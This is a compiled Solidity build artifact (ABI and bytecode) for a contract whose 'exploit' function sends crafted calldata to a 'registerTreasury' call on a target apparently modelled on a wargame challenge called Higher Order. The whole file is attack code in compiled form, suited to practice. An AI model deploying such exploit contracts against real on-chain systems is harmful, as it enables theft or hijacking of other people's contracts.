{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[{"name":"num","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"higherOrder","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract HigherOrderInterface"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516102d73803806102d78339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610272806100656000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806358f69e071461003b578063d45682d91461005a575b600080fd5b6100586004803603602081101561005157600080fd5b503561008b565b005b610062610220565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b604080517f211c85ab000000000000000000000000000000000000000000000000000000006020808301919091526024808301859052835180840390910181526044909201928390526000805483517f211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c595929373ffffffffffffffffffffffffffffffffffffffff909216928592909182918401908083835b602083106101435780518252601f199092019160209182019101610124565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101a5576040519150601f19603f3d011682016040523d82523d6000602084013e6101aa565b606091505b505090508061021a57604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601f60248201527f4661696c656420746f2063616c6c207265676973746572547265617375727900604482015290519081900360640190fd5b50505050565b60005473ffffffffffffffffffffffffffffffffffffffff168156fea2646970667358221220f3293bdeb810e705c5da97db5fe8322c22b66d3cea981d5ed984bd0448e0bf5264736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"exploit(uint256)":"58f69e07","higherOrder()":"d45682d9"},"id":0}